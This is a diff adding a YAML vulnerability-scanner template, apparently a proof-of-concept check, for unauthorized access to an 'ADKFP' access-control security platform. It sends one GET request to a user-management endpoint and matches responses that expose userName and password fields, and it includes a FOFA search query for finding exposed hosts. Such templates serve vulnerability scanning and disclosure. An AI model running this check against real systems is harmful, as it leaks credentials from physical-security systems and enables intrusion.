@@ -1,0 +1,15 @@
+id: poc-yaml-adkfp-adkmanageuser-unauthorized-access
+info:
+  name: ADKFP aDKManageUser 未授权访问漏洞
+  severity: high
+  tags:
+  - 未授权访问
+  finger: 门禁出入口综合安防管理平台
+  fofa: body="/adkfp/getCode"
+requests:
+- method: GET
+  path: /aDKManageUser/selectCll_2?roleId=2&page=1&limit=10
+  expression: status_code == 200 && contains(body,"\"userName\"") && contains(body,"\"password\"")
+    && contains(headers,"application/json")
+variables: {}
+transport: http
